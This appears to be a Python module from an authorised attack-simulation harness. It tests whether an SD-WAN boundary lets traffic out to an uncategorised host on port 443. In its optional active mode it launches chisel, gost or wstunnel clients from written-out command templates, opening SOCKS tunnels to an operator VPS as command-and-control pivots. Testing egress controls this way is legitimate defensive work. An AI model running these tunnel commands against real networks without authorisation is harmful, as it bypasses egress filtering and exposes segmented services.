"""Family A — Self-hosted reverse tunnel to an operator VPS on 443.

The hardest tunnel to filter has NO known-bad domain: a raw TLS/WebSocket tunnel
(chisel / gost / wstunnel) to an attacker-controlled VPS on 443. SOCKS over that
tunnel then reaches otherwise-segmented services (see socks_pivot).

Two modes:
  * INDICATOR (default): TLS-connect to attacker_vps:443 and send non-TLS bytes.
    If either is accepted, the boundary permits egress to an uncategorised host on
    443 and does not enforce L7 there — the precondition for the tunnel. Finding.
  * ACTIVE (--active): actually run the tunnel client (chisel/gost/wstunnel) at
    attacker_vps:443 for a few seconds and confirm it connects, then tear it down.
    Requires the matching SERVER running on your VPS and the client tool locally.

Config: attacker_vps (host/ip of your redirector). MITRE T1090.003 / T1572.
"""
from modules import _util as U

META = {
    "id": "self_tunnel_vps",
    "name": "Self-hosted Tunnel to VPS (chisel/gost, 443)",
    "category": "Egress / C2",
    "test_type": "attack_sim",
    "family": "A",
    "direction": "a2b",
    "added": True,
    "active": True,
    "control": "Egress category filtering + L7/App-ID on 443 (uncategorised host)",
    "fix": "SD-WAN",
    "mitre": ["T1090.003", "T1572"],
    "tactic": "Command and Control",
    "cwe": ["CWE-693"],
    "requires": [],       # tunnel tools checked at runtime only in --active mode
    "ports": [],
    "success_regex": r"^TUNNEL-|^REACHABLE ",
    "blocked_regex": r"egress to VPS blocked|not configured",
}

# client command templates by tool -> (argv, success keywords). {vps} filled in.
_TUNNELS = {
    "chisel":   (["chisel", "client", "{vps}:443", "socks"], ["Connected", "tun:"]),
    "gost":     (["gost", "-L=socks5://:11080", "-F=relay+tls://{vps}:443"],
                 ["listening", "forward"]),
    "wstunnel": (["wstunnel", "-D", "11080", "wss://{vps}:443"], ["connected", "listening"]),
}


def run(target, ctx):
    vps = ctx.cfg("attacker_vps")
    out = ["# self-hosted tunnel test (Family A) — to operator VPS on 443"]
    if not vps:
        out.append(U.skip("attacker_vps not configured (config.json / "
                          "HARNESS_CFG_ATTACKER_VPS) — cannot test tunnel egress."))
        return "\n".join(out)

    # ---- indicator: can we even reach the VPS on 443, and is L7 enforced? ----
    ok, detail = U.tls_reachable(vps, 443, ctx)
    out.append(f"{'REACHABLE' if ok else 'blocked'} {vps}:443 (TLS) — {detail}")
    if not ok:
        out.append(f"egress to VPS blocked — 443 to uncategorised host {vps} is filtered")
        return "\n".join(out)
    out.append(f"[FINDING] egress to uncategorised host {vps}:443 is permitted — a raw "
               "TLS/WS tunnel (chisel/gost/wstunnel) has no known-bad domain to filter.")

    if not ctx.allow_active:
        out.append(U.skip("--active not set — not establishing a live tunnel "
                          "(indicator only). Re-run with --active to prove it."))
        return "\n".join(out)

    # ---- active: run a real tunnel client briefly, confirm it connects --------
    tool = next((t for t in _TUNNELS if U.have(t)), None)
    if not tool:
        out.append("[ERROR] --active set but no tunnel client found "
                   "(install one of: chisel, gost, wstunnel)")
        return "\n".join(out)
    argv, keys = _TUNNELS[tool]
    argv = [a.replace("{vps}", vps) for a in argv]
    out.append(f"[ACTIVE] launching {tool} client to {vps}:443 for up to 12s "
               "(needs the matching server on your VPS)…")
    log, matched = U.run_transient(argv, seconds=12, look_for=keys)
    out.append(log)
    if matched:
        out.append(f"TUNNEL-ESTABLISHED via {tool} to {vps}:443 — full C2/pivot tunnel "
                   "confirmed through the SD-WAN (torn down). This is the impact proof.")
    else:
        out.append(f"[SKIP] {tool} did not confirm a connection in the window — the "
                   "egress precondition still stands (see REACHABLE above); check the "
                   "VPS-side server.")
    return "\n".join(out)
